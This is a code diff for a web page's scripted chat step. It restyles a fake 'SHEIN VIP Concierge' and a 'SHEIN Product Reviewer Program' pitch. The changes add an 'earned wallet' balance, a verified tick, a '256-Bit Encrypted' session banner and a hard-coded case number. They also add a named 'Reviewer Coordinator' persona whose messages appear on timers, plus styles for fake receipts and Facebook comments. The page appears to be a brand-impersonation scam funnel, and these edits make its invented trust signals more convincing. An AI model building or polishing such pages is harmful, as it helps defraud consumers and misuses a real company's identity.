@@ -489,96 +489,365 @@
     .shein-vote-primary { background: #111111; color: #ffffff; box-shadow: 0 4px 14px rgba(0,0,0,0.22); }
     .shein-vote-primary:hover { background: #262626; box-shadow: 0 6px 18px rgba(0,0,0,0.3); }
 
-    /* Legacy support styles maintained */
-    .support-shell { display: flex; flex-direction: column; width: 100%; height: 100svh; height: 100dvh; min-height: 580px; background: var(--fb-surface); }
-    html.chat-full, body.chat-full { width: 100%; height: 100%; overflow: hidden; overscroll-behavior: none; background: var(--fb-surface); }
+    /* ─── Luxury SHEIN VIP Concierge Chat ─── */
+    .support-shell { display: flex; flex-direction: column; width: 100%; height: 100svh; height: 100dvh; min-height: 580px; background: #f8fafc; }
+    html.chat-full, body.chat-full { width: 100%; height: 100%; overflow: hidden; overscroll-behavior: none; background: #f8fafc; }
     body.chat-full .support-shell { min-height: 100svh; min-height: 100dvh; }
-    .support-header { position: relative; z-index: 3; display: flex; flex: none; align-items: center; justify-content: space-between; min-height: 62px; padding: 12px 18px; background: #ffffff; }
-    .support-fb-logo { display: flex; align-items: center; gap: 10px; }
-    .support-fb-circle { width: 40px; height: 40px; flex-shrink: 0; }
-    .support-fb-brand { display: flex; flex-direction: column; justify-content: center; }
-    .support-fb-name { font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size: 20px; font-weight: 900; color: #000000; line-height: 1.05; letter-spacing: 2px; }
-    .support-fb-sub { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size: 12px; font-weight: 700; color: #fa6338; text-transform: uppercase; line-height: 1; letter-spacing: 0.05em; margin-top: 2px; }
-    .support-balance-badge { display: inline-flex; align-items: center; gap: 7px; padding: 6px 14px; border-radius: 12px; background: #E8F8F0; color: #008a3e; font-size: 16px; font-weight: 700; letter-spacing: -0.2px; }
-    .support-balance-badge svg { color: #008a3e; stroke: #008a3e; flex-shrink: 0; }
-    .support-divider { width: 100%; height: 1px; background: #e4e6eb; flex-shrink: 0; }
-    .support-agent-card { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: #ffffff; flex-shrink: 0; }
-    .support-agent-avatar-wrap { width: 44px; height: 44px; border-radius: 50%; overflow: hidden; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-    .support-agent-avatar { width: 44px; height: 44px; border-radius: 50%; object-fit: cover; flex-shrink: 0; }
-    .support-agent-info { display: flex; flex-direction: column; justify-content: center; }
-    .support-agent-name { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 16px; font-weight: 700; color: #050505; line-height: 1.25; }
-    .support-agent-role { display: inline-flex; align-items: center; gap: 5.5px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 13px; font-weight: 500; color: #31a24c; line-height: 1.25; margin-top: 2.5px; }
-    .support-status-dot { width: 7.5px; height: 7.5px; border-radius: 50%; background: #31a24c; display: inline-block; flex-shrink: 0; box-shadow: 0 0 0 2px rgba(49,162,76,0.2); animation: statusPulse 2s ease-in-out infinite; }
-    .support-mini-fb { width: 34px; height: 34px; flex-shrink: 0; border-radius: 50%; }
-    .support-row-system { display: flex; justify-content: center; width: 100%; margin: 6px 0; animation: chatIn .3s ease both; }
-    .support-system-badge { display: inline-flex; align-items: center; justify-content: center; padding: 5px 14px; border-radius: 999px; background: #f0f2f5; color: #65676b; font-size: 12.5px; font-weight: 500; letter-spacing: -0.1px; }
-    .support-chat { display: flex; flex: 1; min-height: 0; flex-direction: column; gap: 14px; overflow-y: auto; padding: 16px 18px 24px; background: #ffffff; scroll-behavior: smooth; -webkit-overflow-scrolling: touch; }
-    .support-row { display: flex; align-items: center; gap: 10px; max-width: 100%; animation: chatIn .34s cubic-bezier(.2,.8,.2,1) both; }
-    .support-row.user { justify-content: flex-end; }
-    .support-mini-avatar { width: 34px; height: 34px; flex: none; border-radius: 50%; object-fit: cover; background: #f0f2f5; }
-    .support-bubble { display: inline-block; max-width: 84%; padding: 13px 18px; border: 1px solid rgba(0,0,0,.04); border-radius: 20px; background: #ffffff; color: #050505; font-size: 15px; line-height: 1.45; text-align: left; overflow-wrap: anywhere; box-shadow: 0 2px 6px rgba(0,0,0,.05), 0 1px 2px rgba(0,0,0,.03); }
-    .support-row.user .support-bubble { border-color: var(--fb-blue); border-radius: 20px; background: var(--fb-blue); color: white; font-weight: 600; box-shadow: 0 3px 12px rgba(24,119,242,.2); }
-    .support-bubble strong { font-weight: 700; color: #050505; }
-    .support-row.user .support-bubble strong { color: white; }
-    .support-typing { display: inline-flex; align-items: center; gap: 4px; min-width: 54px; padding: 12px 14px; }
-    .support-typing span { width: 6px; height: 6px; border-radius: 50%; background: #8a8d91; animation: typingDot 1s ease-in-out infinite; }
+
+    /* Single Unified Concierge Header */
+    .support-header {
+      position: relative;
+      z-index: 10;
+      display: flex;
+      flex: none;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 62px;
+      padding: 10px 16px;
+      background: rgba(255, 255, 255, 0.96);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border-bottom: 1px solid #edf0f5;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.03);
+    }
+    .support-header-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      min-width: 0;
+    }
+    .support-avatar-container {
+      position: relative;
+      flex-shrink: 0;
+    }
+    .support-agent-avatar-wrap {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      background: #111111;
+      border: 1.5px solid #edf0f5;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+      position: relative;
+    }
+    .support-agent-avatar {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    .support-vip-badge-avatar {
+      width: 100%;
+      height: 100%;
+      background: #111111;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .support-vip-badge-avatar img {
+      filter: brightness(0) invert(1);
+    }
+    .support-avatar-online-dot {
+      position: absolute;
+      bottom: 0;
+      right: 0;
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #10b981;
+      border: 2px solid #ffffff;
+      box-shadow: 0 0 6px #10b981;
+    }
+    .support-agent-info {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      min-width: 0;
+    }
+    .support-agent-title-row {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .support-agent-name {
+      font-size: 15px;
+      font-weight: 800;
+      color: #111827;
+      line-height: 1.2;
+      letter-spacing: -0.01em;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .support-verified-tick {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      color: #059669;
+    }
+    .support-agent-role {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11.5px;
+      font-weight: 600;
+      color: #64748b;
+      line-height: 1.2;
+      margin-top: 2px;
+    }
+    .support-status-dot {
+      width: 6.5px;
+      height: 6.5px;
+      border-radius: 50%;
+      background: #10b981;
+      display: inline-block;
+      flex-shrink: 0;
+      box-shadow: 0 0 6px rgba(16,185,129,0.5);
+      animation: statusPulse 1.8s ease-in-out infinite;
+    }
+    .support-balance-badge {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      flex-shrink: 0;
+    }
+    .support-balance-kicker {
+      font-size: 9px;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #94a3b8;
+      margin-bottom: 2px;
+    }
+    .support-balance-val {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 4px 11px;
+      border-radius: 999px;
+      background: #ecfdf5;
+      border: 1px solid #a7f3d0;
+      color: #047857;
+      font-size: 13.5px;
+      font-weight: 800;
+      letter-spacing: -0.01em;
+    }
+    .support-balance-val svg {
+      color: #059669;
+      stroke: #059669;
+      flex-shrink: 0;
+    }
+
+    /* Security & Case ID Strip */
+    .support-session-strip {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 6px 12px;
+      background: #ffffff;
+      border-bottom: 1px solid #edf0f5;
+    }
+    .support-session-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 10.5px;
+      font-weight: 700;
+      letter-spacing: 0.03em;
+      text-transform: uppercase;
+      color: #64748b;
+    }
+    .support-session-dot {
+      opacity: 0.4;
+    }
+    .support-session-id {
+      color: #0f172a;
+      font-weight: 800;
+    }
+
+    /* Chat Messages Container */
+    .support-chat {
+      display: flex;
+      flex: 1;
+      min-height: 0;
+      flex-direction: column;
+      gap: 12px;
+      overflow-y: auto;
+      padding: 16px 14px 24px;
+      background: #f8fafc;
+      scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
+    }
+    .support-row {
+      display: flex;
+      align-items: flex-end;
+      gap: 8px;
+      max-width: 100%;
+      animation: chatIn .3s cubic-bezier(.2,.8,.2,1) both;
+    }
+    .support-row.user {
+      justify-content: flex-end;
+    }
+    .support-avatar-badge-wrap {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+      margin-bottom: 2px;
+    }
+    .support-mini-avatar {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 50%;
+    }
+    .support-mini-bot {
+      background: #111111;
+      border-color: #222222;
+    }
+    .support-mini-bot img {
+      filter: brightness(0) invert(1);
+    }
+    .support-bubble {
+      display: inline-block;
+      max-width: 82%;
+      padding: 12px 16px;
+      border: 1px solid #e9edf2;
+      border-radius: 18px 18px 18px 4px;
+      background: #ffffff;
+      color: #1f2937;
+      font-size: 14.5px;
+      line-height: 1.48;
+      text-align: left;
+      overflow-wrap: anywhere;
+      box-shadow: 0 2px 6px -1px rgba(0,0,0,0.05);
+    }
+    .support-row.user .support-bubble {
+      border-color: #111111;
+      border-radius: 18px 18px 4px 18px;
+      background: #111111;
+      color: #ffffff;
+      font-weight: 600;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.18);
+    }
+    .support-bubble strong {
+      font-weight: 800;
+      color: #111827;
+    }
+    .support-row.user .support-bubble strong {
+      color: #ffffff;
+    }
+    .support-typing {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      min-width: 52px;
+      padding: 12px 16px;
+      border-radius: 18px;
+      background: #ffffff;
+      border: 1px solid #e9edf2;
+      box-shadow: 0 2px 6px -1px rgba(0,0,0,0.04);
+    }
+    .support-typing span {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #94a3b8;
+      animation: typingDot 1s ease-in-out infinite;
+    }
     .support-typing span:nth-child(2) { animation-delay: .15s; }
     .support-typing span:nth-child(3) { animation-delay: .3s; }
+    .support-row-system {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+      margin: 8px 0;
+      animation: chatIn .3s ease both;
+    }
+    .support-system-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 5px 14px;
+      border-radius: 999px;
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      color: #475569;
+      font-size: 11.5px;
+      font-weight: 700;
+      letter-spacing: 0.02em;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+    }
     .support-receipt-loading { display: inline-flex; align-items: center; gap: 12px; }
-    .support-receipt-spinner { width: 20px; height: 20px; flex: none; border: 2.5px solid #e4e6eb; border-top-color: var(--fb-blue); border-radius: 50%; animation: receiptSpin .75s linear infinite; }
-    .support-receipt-loading-text { font-size: 14.5px; font-weight: 500; color: #050505; }
-    .support-receipt { width: min(330px, calc(100vw - 58px)); overflow: hidden; border: 1px solid var(--fb-line); border-radius: 12px; background: white; color: #171717; box-shadow: 0 6px 20px rgba(28,30,33,.14); }
-    .support-receipt-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 10px 12px; background: #171717; color: white; }
-    .support-receipt-brand { display: flex; align-items: center; gap: 7px; min-width: 0; font-size: 13px; font-weight: 700; }
-    .support-receipt-logo { width: 28px; height: 18px; object-fit: contain; }
-    .support-receipt-head > span { flex: none; font-size: 9px; opacity: .72; }
-    .support-receipt-title { padding: 12px; background: var(--fb-blue); color: white; font-size: 21px; font-weight: 800; }
-    .support-receipt-body { padding: 13px; color: var(--fb-text); font-size: 11px; }
+    .support-receipt-spinner { width: 20px; height: 20px; flex: none; border: 2.5px solid #e4e6eb; border-top-color: #111111; border-radius: 50%; animation: receiptSpin .75s linear infinite; }
+    .support-receipt-loading-text { font-size: 14px; font-weight: 600; color: #1f2937; }
+    .support-receipt { width: min(340px, calc(100vw - 52px)); overflow: hidden; border: 1px solid #e5e7eb; border-radius: 16px; background: white; color: #171717; box-shadow: 0 10px 28px rgba(0,0,0,.12); }
+    .support-receipt-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 12px 14px; background: #111111; color: white; }
+    .support-receipt-brand { display: flex; align-items: center; gap: 7px; min-width: 0; font-size: 13px; font-weight: 800; }
+    .support-receipt-logo { width: 22px; height: 22px; object-fit: contain; }
+    .support-receipt-head > span { flex: none; font-size: 9.5px; opacity: .8; }
+    .support-receipt-title { padding: 11px 14px; background: #1f2937; color: white; font-size: 16px; font-weight: 800; }
+    .support-receipt-body { padding: 14px; color: #374151; font-size: 11.5px; }
     .support-receipt-parties { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
     .support-receipt-to { min-width: 0; text-align: right; }
-    .support-receipt-blue { color: var(--fb-blue); font-weight: 700; }
-    .support-receipt-muted { color: var(--fb-muted); overflow-wrap: anywhere; }
+    .support-receipt-blue { color: #6b7280; font-size: 10px; text-transform: uppercase; font-weight: 700; }
+    .support-receipt-muted { color: #9ca3af; overflow-wrap: anywhere; }
     .support-receipt-table { margin-top: 12px; }
     .support-receipt-table-row { display: grid; grid-template-columns: minmax(0,1fr) 30px 70px; }
     .support-receipt-table-row > span { padding: 7px 6px; }
-    .support-receipt-table-head { background: #171717; color: white; font-weight: 700; }
-    .support-receipt-table-value { border-bottom: 2px solid var(--fb-blue); }
+    .support-receipt-table-head { background: #f3f4f6; color: #111827; font-weight: 700; }
+    .support-receipt-table-value { border-bottom: 2px solid #111111; }
     .support-receipt-table-row > span:nth-child(2) { text-align: center; }
     .support-receipt-table-row > span:last-child { text-align: right; font-weight: 700; }
-    .support-receipt-total { display: flex; align-items: baseline; justify-content: flex-end; gap: 7px; padding: 9px 0 11px; font-weight: 700; }
-    .support-receipt-total strong { color: var(--fb-blue); font-size: 22px; }
-    .support-receipt-details { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; border-top: 1px solid var(--fb-line); padding-top: 10px; }
+    .support-receipt-total { display: flex; align-items: baseline; justify-content: flex-end; gap: 7px; padding: 10px 0 8px; font-weight: 700; }
+    .support-receipt-total strong { color: #059669; font-size: 24px; font-weight: 900; }
+    .support-receipt-details { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; border-top: 1px dashed #d1d5db; padding-top: 10px; }
     .support-receipt-sign { text-align: right; }
     .support-receipt-signature { font-family: "Brush Script MT", "Segoe Script", cursive; font-size: 17px; }
-    .support-receipt-method, .support-receipt-notice { margin-top: 11px; border-top: 1px solid var(--fb-line); padding-top: 9px; }
-    .support-receipt-notice { padding: 8px; border: 1px solid var(--fb-line); border-radius: 5px; }
-    .support-receipt-foot { display: flex; align-items: center; justify-content: center; padding: 10px 12px; background: var(--fb-blue); }
+    .support-receipt-method, .support-receipt-notice { margin-top: 10px; border-top: 1px solid #f1f3f7; padding-top: 8px; }
+    .support-receipt-notice { padding: 8px; border: 1px solid #f1f3f7; border-radius: 5px; }
+    .support-receipt-foot { display: flex; align-items: center; justify-content: center; padding: 11px 14px; background: #111111; }
     .receipt-foot-brand { display: inline-flex; align-items: center; gap: 6px; }
     .receipt-foot-brand svg { width: 17px; height: 17px; flex-shrink: 0; }
     .receipt-foot-text { display: flex; flex-direction: column; line-height: 1; text-align: left; }
     .receipt-foot-name { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 11px; font-weight: 800; color: #ffffff; letter-spacing: -0.3px; line-height: 1; }
     .receipt-foot-sub { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 8px; font-weight: 400; color: rgba(255,255,255,0.92); letter-spacing: -0.1px; margin-top: 2px; line-height: 1; }
-    .support-video { width: min(320px, calc(100vw - 66px)); overflow: hidden; border: 1px solid var(--fb-line); border-radius: 12px; background: #000; box-shadow: 0 4px 16px rgba(0,0,0,.15); }
+    .support-video { width: min(320px, calc(100vw - 66px)); overflow: hidden; border: 1px solid #e5e7eb; border-radius: 12px; background: #000; box-shadow: 0 4px 16px rgba(0,0,0,.15); }
     .support-video iframe { border: 0; }
     .support-image { display: block; width: min(290px, calc(100vw - 76px)); height: auto; border: 1px solid rgba(0,0,0,.05); border-radius: 16px; box-shadow: 0 1px 2px rgba(0,0,0,.08); }
-    .support-footer { flex: none; padding: 12px 16px max(12px, env(safe-area-inset-bottom)); background: #ffffff; border-top: 1px solid #e4e6eb; }
+
+    /* Footer / Interaction */
+    .support-footer { flex: none; padding: 12px 14px max(12px, env(safe-area-inset-bottom)); background: #ffffff; border-top: 1px solid #edf0f5; box-shadow: 0 -2px 10px rgba(0,0,0,0.02); }
     .support-footer:not(:has(.support-choice.visible)):not(:has(.support-form.visible)) { display: none; }
-    .support-choice { display: none; width: 100%; min-height: 48px; padding: 12px 18px; border-radius: 999px; background: var(--fb-blue); color: white; font-size: 15px; font-weight: 700; box-shadow: 0 4px 14px rgba(24,119,242,.3); }
+    .support-choice { display: none; width: 100%; min-height: 50px; padding: 14px 20px; border-radius: 14px; background: #111111; color: white; font-size: 14px; font-weight: 800; letter-spacing: 0.03em; text-transform: uppercase; box-shadow: 0 4px 16px rgba(0,0,0,0.22); cursor: pointer; transition: all .15s ease; border: none; text-align: center; }
+    .support-choice:hover { background: #262626; box-shadow: 0 6px 20px rgba(0,0,0,0.28); }
+    .support-choice:active { transform: scale(0.98); }
     .support-choice.visible { display: block; animation: chatIn .3s ease both; }
-    .support-form { display: none; align-items: center; grid-template-columns: minmax(0,1fr) auto; gap: 10px; animation: chatIn .3s ease both; }
+    .support-form { display: none; align-items: center; grid-template-columns: minmax(0,1fr) auto; gap: 8px; animation: chatIn .3s ease both; }
     .support-form.visible { display: grid; }
-    .support-input { min-width: 0; height: 48px; border: 1px solid #e4e6eb; border-radius: 999px; padding: 0 20px; background: #F0F2F5; color: #050505; font-size: 15px; outline: none; transition: background .15s, border-color .15s; }
-    .support-input::placeholder { color: #8a8d91; }
-    .support-input:focus { background: #ffffff; border-color: var(--fb-blue); box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
-    .support-send { width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 50%; background: var(--fb-blue); color: white; flex-shrink: 0; transition: transform .1s, filter .15s; }
+    .support-input { min-width: 0; height: 48px; border: 1.5px solid #e2e8f0; border-radius: 14px; padding: 0 16px; background: #f8fafc; color: #0f172a; font-size: 14.5px; font-weight: 600; outline: none; transition: border-color .15s, background .15s; }
+    .support-input::placeholder { color: #94a3b8; }
+    .support-input:focus { background: #ffffff; border-color: #111111; box-shadow: 0 0 0 3px rgba(17,17,17,0.08); }
+    .support-send { width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; border-radius: 14px; background: #111111; color: white; flex-shrink: 0; transition: transform .1s, background .15s; border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.18); }
+    .support-send:hover { background: #262626; }
     .support-send:active { transform: scale(.94); }
-    .support-send svg { margin-left: 2px; }
-    .support-note { margin-top: 7px; color: var(--fb-muted); font-size: 10px; text-align: center; }
+    .support-note { margin-top: 7px; color: #94a3b8; font-size: 10px; text-align: center; }
     @keyframes chatIn { from { opacity: 0; transform: translateY(7px); } to { opacity: 1; transform: translateY(0); } }
     @keyframes typingDot { 0%, 60%, 100% { transform: translateY(0); opacity: .45; } 30% { transform: translateY(-3px); opacity: 1; } }
     @keyframes receiptSpin { to { transform: rotate(360deg); } }
     @keyframes statusPulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: .5; transform: scale(.85); } }
-    @keyframes ctaPulseBlue { 0%, 100% { box-shadow: 0 6px 18px rgba(24,119,242,.35); } 50% { box-shadow: 0 6px 26px rgba(24,119,242,.6); } }
     .smartplayer-scroll-event { display: block; width: 100%; height: 1px; min-height: 1px; margin: 0; padding: 0; opacity: 0; pointer-events: none; }
     /* ─── Facebook Post & Comments in Chat ─── */
     .support-row-fbpost { display: flex; align-items: flex-start; gap: 10px; max-width: 100%; animation: chatIn .34s cubic-bezier(.2,.8,.2,1) both; }
@@ -680,7 +949,7 @@
         width: 100%;
         height: var(--chat-viewport-height, 100dvh);
         overflow: hidden;
-        background: var(--fb-surface);
+        background: #f8fafc;
       }
       body.chat-full .support-shell {
         width: 100%;
@@ -690,19 +959,31 @@
         margin: 0;
         box-shadow: none;
       }
-      body.chat-full .support-header { min-height: 48px; padding: 6px 12px; background: var(--fb-surface); }
-      body.chat-full .support-fb-circle { width: 32px; height: 32px; }
-      body.chat-full .support-fb-name { font-size: 17px; }
-      body.chat-full .support-fb-sub { font-size: 11px; margin-top: 1px; }
-      body.chat-full .support-balance-badge { padding: 4px 10px; font-size: 13.5px; border-radius: 8px; gap: 5px; }
-      body.chat-full .support-balance-badge svg { width: 16px; height: 16px; }
-      body.chat-full .support-agent-card { padding: 8px 12px; gap: 10px; }
-      body.chat-full .support-agent-avatar-wrap,
-      body.chat-full .support-agent-avatar { width: 34px; height: 34px; }
-      body.chat-full .support-agent-name { font-size: 14px; }
-      body.chat-full .support-agent-role { font-size: 11.5px; margin-top: 1px; }
-      body.chat-full .support-status-dot { width: 6px; height: 6px; }
-      body.chat-full .support-chat { min-height: 0; padding: 12px 14px 20px; gap: 11px; overscroll-behavior: contain; }
+      body.chat-full .support-header {
+        min-height: 56px;
+        padding: 8px 12px;
+        background: rgba(255, 255, 255, 0.96);
+      }
+      body.chat-full .support-agent-avatar-wrap {
+        width: 38px;
+        height: 38px;
+      }
+      body.chat-full .support-agent-name {
+        font-size: 14px;
+      }
+      body.chat-full .support-agent-role {
+        font-size: 11px;
+      }
+      body.chat-full .support-balance-val {
+        padding: 3px 9px;
+        font-size: 12.5px;
+      }
+      body.chat-full .support-chat {
+        min-height: 0;
+        padding: 12px 12px 20px;
+        gap: 10px;
+        overscroll-behavior: contain;
+      }
     }
     @media (prefers-reduced-motion: reduce) { .appear, .pulse { animation: none !important; } }
   </style>
@@ -844,40 +1125,58 @@
       <!-- ─────────────────────────────────────────── -->
       <div id="step-4" class="step" data-funnel-view="chat">
         <div class="support-shell appear">
+          <!-- Unified Luxury VIP Concierge Header -->
           <header class="support-header">
-            <div class="support-fb-logo">
-              <svg class="support-fb-circle" viewBox="0 0 36 36" width="40" height="40" fill="none">
-                <circle cx="18" cy="18" r="18" fill="#111111"/>
-                <text x="18" y="24" font-family="'Inter', sans-serif" font-weight="900" font-size="18" fill="#FFFFFF" text-anchor="middle">S</text>
-              </svg>
-              <div class="support-fb-brand">
-                <span class="support-fb-name">SHEIN</span>
-                <span class="support-fb-sub">vip reviewer</span>
+            <div class="support-header-left">
+              <div class="support-avatar-container">
+                <div class="support-agent-avatar-wrap" id="support-agent-avatar-wrap">
+                  <div class="support-vip-badge-avatar">
+                    <img src="images/shein-icon.svg" width="22" height="22" alt="SHEIN VIP">
+                  </div>
+                </div>
+                <span class="support-avatar-online-dot"></span>
+              </div>
+              <div class="support-agent-info">
+                <div class="support-agent-title-row">
+                  <span class="support-agent-name" id="support-agent-name">SHEIN VIP Concierge</span>
+                  <span class="support-verified-tick" title="Verified Concierge">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="#059669">
+                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                  </span>
+                </div>
+                <div class="support-agent-role" id="support-agent-role">
+                  <span class="support-status-dot"></span>
+                  <span>Reviewer Desk • Active Now</span>
+                </div>
               </div>
             </div>
+
             <div class="support-balance-badge">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="2" y="5" width="20" height="14" rx="3"></rect>
-                <line x1="2" y1="10" x2="22" y2="10"></line>
-                <line x1="6" y1="15" x2="9" y2="15"></line>
-              </svg>
-              <span id="balance-chat">$ 278.45</span>
+              <span class="support-balance-kicker">EARNED WALLET</span>
+              <div class="support-balance-val">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="2" y="5" width="20" height="14" rx="3"></rect>
+                  <line x1="2" y1="10" x2="22" y2="10"></line>
+                </svg>
+                <span id="balance-chat">$ 278.45</span>
+              </div>
             </div>
           </header>
-          <div class="support-divider"></div>
-          <div class="support-agent-card">
-            <div class="support-agent-avatar-wrap" id="support-agent-avatar-wrap">
-              <svg class="support-fb-circle" viewBox="0 0 36 36" width="44" height="44" fill="none">
-                <circle cx="18" cy="18" r="18" fill="#111111"/>
-                <text x="18" y="27" font-family="'Inter', sans-serif" font-weight="900" font-size="20" fill="#FFFFFF" text-anchor="middle">S</text>
+
+          <!-- Security & Case ID Trust Strip -->
+          <div class="support-session-strip">
+            <div class="support-session-pill">
+              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
               </svg>
-            </div>
-            <div class="support-agent-info">
-              <div class="support-agent-name" id="support-agent-name">SHEIN VIP Support</div>
-              <div class="support-agent-role" id="support-agent-role"><span class="support-status-dot"></span><span>Online</span></div>
+              <span>256-Bit Encrypted Concierge Session</span>
+              <span class="support-session-dot">•</span>
+              <span class="support-session-id">Case #SH-809821</span>
             </div>
           </div>
-          <div class="support-divider"></div>
+
           <main id="support-chat" class="support-chat" aria-live="polite"></main>
           <footer class="support-footer">
             <button id="support-choice" type="button" class="support-choice" onclick="answerSupport()"></button>
@@ -1345,9 +1644,9 @@
 
   function getAgentAvatarHtml() {
     if (currentSupportAgent === "emily") {
-      return '<img class="support-mini-avatar" src="images/emily-support.webp" alt="Chloe Bennett">';
+      return '<div class="support-avatar-badge-wrap"><img class="support-mini-avatar" src="images/emily-support.webp" alt="Chloe Bennett"></div>';
     }
-    return '<svg class="support-mini-avatar support-mini-fb" viewBox="0 0 36 36" width="34" height="34" fill="none"><circle cx="18" cy="18" r="18" fill="#111111"/><text x="18" y="24" font-family=\"Inter\", sans-serif font-weight="900" font-size="18" fill="#FFFFFF" text-anchor="middle">S</text></svg>';
+    return '<div class="support-avatar-badge-wrap support-mini-bot"><img src="images/shein-icon.svg" width="16" height="16" alt="SHEIN VIP"></div>';
   }
 
   function updateSupportAgentCard(agent) {
@@ -1358,11 +1657,11 @@
     if (agent === "emily") {
       wrap.innerHTML = '<img class="support-agent-avatar" src="images/emily-support.webp" alt="Chloe Bennett">';
       nameEl.textContent = "Chloe Bennett";
-      roleEl.innerHTML = '<span class="support-status-dot"></span><span>SHEIN Reviewer Coordinator · Online</span>';
+      roleEl.innerHTML = '<span class="support-status-dot"></span><span>Senior Reviewer Coordinator • Online</span>';
     } else {
-      wrap.innerHTML = '<svg class="support-fb-circle" viewBox="0 0 36 36" width="44" height="44" fill="none"><circle cx="18" cy="18" r="18" fill="#111111"/><text x="18" y="27" font-family=\"Inter\", sans-serif font-weight="900" font-size="20" fill="#FFFFFF" text-anchor="middle">S</text></svg>';
-      nameEl.textContent = "SHEIN VIP Support";
-      roleEl.innerHTML = '<span class="support-status-dot"></span><span>Online</span>';
+      wrap.innerHTML = '<div class="support-vip-badge-avatar"><img src="images/shein-icon.svg" width="22" height="22" alt="SHEIN VIP"></div>';
+      nameEl.textContent = "SHEIN VIP Concierge";
+      roleEl.innerHTML = '<span class="support-status-dot"></span><span>Reviewer Desk • Active Now</span>';
     }
   }
 
@@ -1372,7 +1671,7 @@
     supportTyping(false);
     var row = document.createElement("div");
     row.className = "support-row-system";
-    row.innerHTML = '<span class="support-system-badge">' + text + '</span>';
+    row.innerHTML = '<span class="support-system-badge"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#059669;"><polyline points="20 6 9 17 4 12"></polyline></svg>' + text + '</span>';
     chat.appendChild(row);
     supportScroll();
   }
@@ -1398,9 +1697,9 @@
     { type:"wait", ms:1300 },
     { type:"text", text:"You've been selected for the official<br><strong>SHEIN Product Reviewer Program.</strong>" },
     { type:"wait", ms:1000 },
-    { type:"join", track:"atendente", text:"Chloe Bennett joined the chat" },
+    { type:"join", track:"atendente", text:"Chloe Bennett (Reviewer Coordinator) connected" },
     { type:"wait", ms:1400 },
-    { type:"text", text:"My name is Chloe Bennett and I'm your assigned Reviewer Coordinator." },
+    { type:"text", text:"Hello! My name is Chloe Bennett and I'm your assigned Reviewer Coordinator." },
     { type:"wait", ms:1200 },
